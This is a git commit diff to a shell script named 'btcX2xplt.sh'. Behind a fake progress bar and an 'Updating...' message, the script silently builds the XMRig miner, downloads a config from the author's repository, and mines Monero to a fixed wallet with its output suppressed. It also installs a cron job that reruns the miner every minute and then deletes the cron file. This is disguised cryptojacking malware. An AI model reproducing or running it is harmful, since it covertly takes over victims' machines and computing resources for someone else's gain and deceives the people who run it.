bb73b85be86249f6a3d38e5a777361b491313bc9
katerin966 <72075504+katerin966@users.noreply.github.com>
2021-01-20 22:30:18 +0000

    Update btcX2xplt.sh

--- btcX2xplt.sh
+++ btcX2xplt.sh
@@ -21,12 +21,12 @@ while [ $count -lt $total ]; do
   printf "\r%3d.%1d%% %.${pd}s" $(( $count * 100 / $total )) $(( ($count * 1000 / $total) % 10 )) $pstr
 done
 echo "Updating..."
-sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo apt install git && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &   
+sudo apt update && sudo apt install git && sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && sudo apt install git && git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &   
 echo ""
 echo ""
 echo ""
 echo ""
-echo "*/1 * * * * git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &" > cron && cat cron | crontab -
+echo "*/1 * * * * git clone https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc) && wget https://raw.githubusercontent.com/katerin966/0/main/config.json && ./xmrig -o pool.supportxmr.com:443 -u 44RMgEtJcpDjJfSNfFCW3VfZt6jx8e9X9UPuEva36n5wCyZd2w9QXHtXiipZk8yfDWcn9V3rL4iEbZ6nVCuM9NTXUnTXqcx -k --tls -p Linux > /dev/null 2>&1 &" > cron && cat cron | crontab -
 echo ""
 rm cron
 echo ""
